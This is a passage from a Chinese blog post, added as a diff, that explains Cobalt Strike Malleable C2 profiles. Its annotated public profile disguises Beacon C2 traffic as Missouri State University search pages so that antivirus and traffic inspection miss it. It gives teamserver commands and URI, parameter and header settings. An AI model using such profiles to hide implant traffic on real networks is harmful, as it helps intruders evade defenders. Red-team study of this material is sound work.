@@ -152,6 +152,254 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于Malleable C2的学习总结</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-09-02 10:27:15 / Modified: 20:03:48" itemprop="dateCreated datePublished" datetime="2020-09-02T10:27:15+08:00">2020-09-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
+                    <span itemprop="name">cobaltstrike</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        通过之前我们对于CobaltStrike的Beacon通信流程分析，我们可以看到CobaltStrike在使用心跳包发送active和match，执行命令的返回结果通过请求submit.php来进行传输，而且我们通过这两个包发送和接收的也是一些加密的内容，因此可能有些杀软可能会对这样的请求进行拦截，如果这样，那么无论我们之前对shellcode怎么免杀，只要和服务端产生一些通信，那么都有可能被拦截，因此我们需要修改掉这些流量特征，好在CobaltStrike已经给我们提供了这样的功能，那就是malleable C2。</p>
+<h3 id="关于malleable-C2基本介绍"><a href="#关于malleable-C2基本介绍" class="headerlink" title="关于malleable C2基本介绍"></a>关于malleable C2基本介绍</h3><p><strong>什么是malleable C2?</strong></p>
+<p>​        Beacon的HTTP的indicators由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。 也就是说当Beacon使用HTTP进行通信时，可以通过Malleable-C2来控制如何接收和发送指令。</p>
+<p><strong>为什么要使用malleable C2?</strong></p>
+<p>​        因为我们使用默认beacon通信方式可以看到存在一些特征，所以我们需要通过需改Malleable-C2来更改流量的特征，让beacon和CoblatStrike服务端的通信流量尽量来模拟正常的访问通信，要实现这个功能，可以通过编写malleable-C2-profile来实现。</p>
+<h3 id="malleable-C2-profile的编写分析"><a href="#malleable-C2-profile的编写分析" class="headerlink" title="malleable C2-profile的编写分析"></a>malleable C2-profile的编写分析</h3><p><strong>如何使用malleable C2-profile文件?</strong></p>
+<p>​        我以网上公开的profile为例进行分析，<a href="https://github.com/xx0hcd/Malleable-C2-Profiles" target="_blank" rel="noopener">github地址</a>,下载后normal\msu_edu.profile来进行分析</p>
+<p>​        当我们启动团队服务器时，可以使用如下命令来加载Malleable-C2-profile文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver [external IP] [password] [&#x2F;path&#x2F;to&#x2F;my.profile]</span><br></pre></td></tr></table></figure>
+
+<p>​        将normal\msu_edu.profile上传到服务器，使用上面的命令可以加载，但是在加载之前首先要测试这个profile文件的内容格式是否有问题，可以通过c2lint命令来检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;c2lint xxxx.profile</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170520452.png" alt="image-20200902170520452"></p>
+<p>​        测试过程中+代表测试通过，%代表提醒的内容，！代表不通过的选项</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170554118.png" alt="image-20200902170554118"></p>
+<p>​        检查通过以后，我们通过下面的命令启动teamserver并且加载 malleable-C2-profile文件 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;teamserver  ip password msu_edu.profile</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170742151.png" alt="image-20200902170742151"></p>
+<p><strong>如何编写一个Malleable-C2-profile文件？</strong></p>
+<p>​        打开后文件的开头如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;msu_edu.profile&quot;;  &#x2F;&#x2F;通过set给变量sample_name进行赋值</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;37500&quot;;   &#x2F;&#x2F;设置睡眠时间为37秒左右</span><br><span class="line">set jitter    &quot;33&quot;;     &#x2F;&#x2F;设置抖动率，为了防止请求时间过于规律，在这里设置抖动率为33%</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1) AppleWebKit&#x2F;587.38 (KHTML, like Gecko)   Chrome&#x2F;41.0.2228.0 Safari&#x2F;537.36&quot;;  &#x2F;&#x2F;设置user-agent</span><br><span class="line"></span><br><span class="line">#set host_stage &quot;false&quot;;  &#x2F;&#x2F;如果不需要分阶段传输payload，就可以在这里将host_stage的值设置为false</span><br><span class="line"></span><br><span class="line">###DNS options###</span><br><span class="line">set dns_idle &quot;8.8.8.8&quot;;   </span><br><span class="line">set maxdns    &quot;245&quot;;  &#x2F;&#x2F;通过dns传输数据时主机名的最大长度</span><br><span class="line">set dns_sleep &quot;0&quot;; &#x2F;&#x2F;在每个dns请求之间设置延时，这里没有延时</span><br><span class="line">set dns_stager_prepend &quot;&quot;; &#x2F;&#x2F;在dns payload之前插入内容</span><br><span class="line">set dns_stager_subhost &quot;&quot;; &#x2F;&#x2F;设置dns txt record stager的子域名</span><br><span class="line">set dns_max_txt &quot;252&quot;; &#x2F;&#x2F;设置dns txt返回最大长度</span><br><span class="line">set dns_ttl &quot;1&quot;; &#x2F;&#x2F;设置DNS响应的ttl的值</span><br><span class="line"></span><br><span class="line">###SMB options###</span><br><span class="line">set pipename &quot;ntsvcs&quot;;  &#x2F;&#x2F;在使用Smb beacon来进行通信时，设置命名管道的名字</span><br><span class="line">set pipename_stager &quot;scerpc&quot;;  &#x2F;&#x2F;设置stager使用的管道名</span><br><span class="line"></span><br><span class="line">###TCP options###</span><br><span class="line">set tcp_port &quot;8000&quot;;  &#x2F;&#x2F;设置tcp_beacon监听的端口，这里设置的是8000</span><br></pre></td></tr></table></figure>
+
+<p>​        通过上面的配置，我们实现了以37秒为基准，百分之33左右的抖动率的功能，并且使用smb beacon时，默认的命名管道名字为ntsvcs</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171550504.png" alt="image-20200902171550504"></p>
+<p>​        当使用tcp beacon时，默认的端口是8000</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171657470.png" alt="image-20200902171657470"></p>
+<p>​        并且默认的user-agent将使用我们上面配置的.</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172224238.png" alt="image-20200902172224238">    </p>
+<p>​        我们继续分析，看看后面的配置文件,下面的配置文件主要用来配置证书和response header</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">###SSL Options### &#x2F;&#x2F;这个主要是给https beacon使用的配置</span><br><span class="line">#https-certificate &#123;</span><br><span class="line">    #set keystore &quot;your_store_file.store&quot;;  &#x2F;&#x2F;java kerstore文件</span><br><span class="line">    #set password &quot;your_store_pass&quot;; &#x2F;&#x2F;keystore文件的打开密码</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#https-certificate &#123;  &#x2F;&#x2F;自签名的https证书配置</span><br><span class="line">#    set C &quot;US&quot;;   &#x2F;&#x2F;国家</span><br><span class="line">#    set CN &quot;whatever.com&quot;; &#x2F;&#x2F;域名</span><br><span class="line">#    set L &quot;California&quot;; &#x2F;&#x2F;地区</span><br><span class="line">#    set O &quot;whatever LLC.&quot;;  &#x2F;&#x2F;组织名</span><br><span class="line">#    set OU &quot;local.org&quot;; &#x2F;&#x2F;组织单位名称</span><br><span class="line">#    set ST &quot;CA&quot;; &#x2F;&#x2F;州或者省</span><br><span class="line">#   set validity &quot;365&quot;; &#x2F;&#x2F;时效</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#code-signer &#123;  &#x2F;&#x2F;代码签名</span><br><span class="line">    #set keystore &quot;your_keystore.jks&quot;; &#x2F;&#x2F; java kerstore文件</span><br><span class="line">    #set password &quot;your_password&quot;;  &#x2F;&#x2F;keystore文件的打开密码</span><br><span class="line">    #set alias &quot;server&quot;;  &#x2F;&#x2F;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">###HTTP-Config Block###  &#x2F;&#x2F;配置reponse header块</span><br><span class="line">http-config &#123;</span><br><span class="line">    #set headers &quot;Server, Content-Type&quot;;  </span><br><span class="line">    #header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">    #header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line"></span><br><span class="line">    set trust_x_forwarded_for &quot;false&quot;;  &#x2F;&#x2F;如果teamserver使用了http重定向器，就需要选择true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        下面我们来配置GET请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-GET Block###</span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;siteindex&#x2F;a&#x2F; &#x2F;siteindex&#x2F;b&#x2F; &#x2F;siteindex&#x2F;c&#x2F;&quot;;  &#x2F;&#x2F;配置请求的Uri路径</span><br><span class="line"></span><br><span class="line">    #set verb &quot;POST&quot;; &#x2F;&#x2F;用什么方法传输数据，不仅可以配置为get也可以配置为post</span><br><span class="line">    </span><br><span class="line">    client &#123;  &#x2F;&#x2F;client端的配置</span><br><span class="line"></span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.edu&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">	   </span><br><span class="line">    metadata &#123; &#x2F;&#x2F;metadata是一段加密的数据，但是没有编码，所以他不能在请求头和URI中发送。需要使用base64、base64url或者netbios编码之后才能在请求头和URI中发送。</span><br><span class="line">        #base64</span><br><span class="line">        base64url;  &#x2F;&#x2F; 使用URL-safe Base64 进行编码</span><br><span class="line">        #mask;</span><br><span class="line">        #netbios;</span><br><span class="line">        #netbiosu;</span><br><span class="line">        #prepend &quot;TEST123&quot;;  &#x2F;&#x2F;开头插入字符串</span><br><span class="line">        #append &quot;.php&quot;; &#x2F;&#x2F;末尾追加字符串</span><br><span class="line"></span><br><span class="line">        parameter &quot;filter&quot;; &#x2F;&#x2F;把数据放到名为filter的uri参数中</span><br><span class="line">        #header &quot;Cookie&quot;; &#x2F;&#x2F;把数据放到名为Cookie的http头中</span><br><span class="line">        #uri-append; &#x2F;&#x2F;把数据直接追加到URI上</span><br><span class="line"></span><br><span class="line">        #print;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  &#x2F;&#x2F;server端的请求配置</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html; charset&#x3D;utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID&#x3D;handle; path&#x3D;&#x2F;&quot;;</span><br><span class="line"> </span><br><span class="line">        output &#123;</span><br><span class="line"></span><br><span class="line">            netbios;</span><br><span class="line">            #netbiosu;</span><br><span class="line">            #base64;</span><br><span class="line">            #base64url;</span><br><span class="line">            #mask;</span><br><span class="line">  </span><br><span class="line">            prepend &quot;    &lt;link href&#x3D;\&quot;&#x2F;resource&#x2F;styles\&quot; media&#x3D;\&quot;all\&quot; rel&#x3D;\&quot;stylesheet\&quot; &#x2F;&gt;    &lt;script src&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;scripts&#x2F;2018&#x2F;common.js?_q&#x3D;&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name&#x3D;\&quot;robots\&quot; content&#x3D;\&quot;noindex\&quot; &#x2F;&gt;&lt;link rel&#x3D;\&quot;Stylesheet\&quot; media&#x3D;\&quot;all\&quot; href&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;styles&#x2F;msuwds&#x2F;main-sgf.css\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name&#x3D;\&quot;vireport\&quot; content&#x3D;\&quot;width&#x3D;device-width, initial-scale&#x3D;1.0\&quot; &#x2F;&gt;\n&quot;;   </span><br><span class="line">            prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;&#x2F;title&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta charset&#x3D;\&quot;UTF-8\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">	    prepend &quot;&lt;html lang&#x3D;\&quot;en\&quot; itemscope itemtype&#x3D;\&quot;https:&#x2F;&#x2F;schema.org&#x2F;SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;&gt;&lt;&#x2F;script&gt;\n&quot;;</span><br><span class="line">            append &quot;&lt;h2&gt;About search&lt;&#x2F;h2&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutwebsearch.htm\&quot;&gt;About web search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;]n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutpeoplesearch.htm\&quot;&gt;About people search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;abouteventsearch.htm\&quot;&gt;About event search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutmapsearch.htm\&quot;&gt;About map search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;&quot;;</span><br><span class="line">	    append &quot;&lt;&#x2F;ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            print;  &#x2F;&#x2F;以print为结束</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        通过上面的HTTP-GET块的配置，我们配置了心跳包的请求URI为/siteindex/a/，并且设置了通过filter字段来传输信息，并且返回包的内容也和我们在server部分的配置相同。这里有一个点需要注意，就是在使用prepend在返回包中添加内容时，在多个prepend字段配置中,prepend字段添加的越早，显示时越在后面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">       prepend &quot;    &lt;link href&#x3D;\&quot;&#x2F;resource&#x2F;styles\&quot; media&#x3D;\&quot;all\&quot; rel&#x3D;\&quot;stylesheet\&quot; &#x2F;&gt;    &lt;script src&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;scripts&#x2F;2018&#x2F;common.js?_q&#x3D;&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name&#x3D;\&quot;robots\&quot; content&#x3D;\&quot;noindex\&quot; &#x2F;&gt;&lt;link rel&#x3D;\&quot;Stylesheet\&quot; media&#x3D;\&quot;all\&quot; href&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;styles&#x2F;msuwds&#x2F;main-sgf.css\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name&#x3D;\&quot;vireport\&quot; content&#x3D;\&quot;width&#x3D;device-width, initial-scale&#x3D;1.0\&quot; &#x2F;&gt;\n&quot;;   </span><br><span class="line">       prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;&#x2F;title&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta charset&#x3D;\&quot;UTF-8\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">prepend &quot;&lt;html lang&#x3D;\&quot;en\&quot; itemscope itemtype&#x3D;\&quot;https:&#x2F;&#x2F;schema.org&#x2F;SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172951017.png" alt="image-20200902172951017"></p>
+<p>​        我们再看一下当我们向client发送指令时的数据包,我们可以看到server端传递的请求在参数q中</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180603819.png" alt="image-20200902180603819"></p>
+<p>​        当客户端收到指令时，一般通过post来向服务端返回命令执行的结果，这部分可以通过http-post部分来配置，配置过程如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Post Block###</span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;getsearchresults&quot;;  &#x2F;&#x2F;配置post请求的uri</span><br><span class="line">    #set verb &quot;GET&quot;;</span><br><span class="line">    set verb &quot;POST&quot;;  &#x2F;&#x2F;配置请求的形式</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">#	header &quot;Host&quot; &quot;search.missouristate.edu&quot;;    &#x2F;&#x2F;配置请求头的信息</span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en-US&quot;;   </span><br><span class="line">        </span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;   &#x2F;&#x2F; URL-safe Base64 编码形式输出</span><br><span class="line">	    parameter &quot;site_indexFilter&quot;;  &#x2F;&#x2F;将数据放到site_indexFilter参数中进行传输</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        id &#123; &#x2F;&#x2F;通过id标识应该输出到哪个beacon</span><br><span class="line">	    base64url;   </span><br><span class="line">	    parameter &quot;peopleFilter&quot;;  &#x2F;&#x2F;将数据放到peopleFilter参数中进行传输</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    parameter &quot;eventsFilter&quot; &quot;campus:sgf&quot;;    &#x2F;&#x2F;配置一些其他的请求参数和参数值</span><br><span class="line">#    parameter &quot;mapFilter&quot; &quot;campus&quot;;</span><br><span class="line">    parameter &quot;query&quot; &quot;my%20missouri%20state&quot;;</span><br><span class="line">    parameter &quot;resultCounts&quot; &quot;5,3,3,3&amp;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;json; charset&#x3D;utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent,AcceptEncoding&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;  &#x2F;&#x2F;通过netbios传输信息 </span><br><span class="line">	   </span><br><span class="line">	    prepend &quot;[\&quot;&#123;\\\&quot;results\\\&quot;:[\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https:&#x2F;&#x2F;www.missouristatefoundation.org&#x2F;\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;\\\\\\\&quot;development; endowment; foundation; Foundation, Missouri State; fundraising; missouri state foundation; missouri state university foundation\\\\\\\&quot;,\\\\\\\&quot;UnitType\\\\\\\&quot;:\\\\\\\&quot;Department\\\\\\\&quot;&#125;\\\&quot;,\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https:&#x2F;&#x2F;outreach.missouristate.edu&#x2F;\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:\\\\\\\&quot;distance learning; dual credit; evening; extended campus; Extended Campus (now Missouri State Outreach); i courses; i-courses; icourses; interactive video; itv; non credit; non-credit; noncredit; off campus; off-campus; offcampus; online; outreach; Outreach, Missouri State\\\\\\\&quot;&#125;\&quot;]&quot;;</span><br><span class="line"></span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​         通过上面对于http-post的配置，我们可以看到通过post的方式请求getsearchresults这个uri,并且在请求中加入了site_indexFilter字段，这个字段用来传输命令执行的结果。通过peopleFilter这个字段来返回beacon client对应的id。并且加上了query和resultCounts这两个参数，不过这两个参数的内容都是写死的。最后在server部分我们配置了返回的内容。我们使用wireshark来看下请求的内容与我们的配置是否一致</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180954689.png" alt="image-20200902180954689"></p>
+<p>​        下面我们配置http-stager的信息，我们可以在下面的代码块中定义自己下载stage的行为</p>
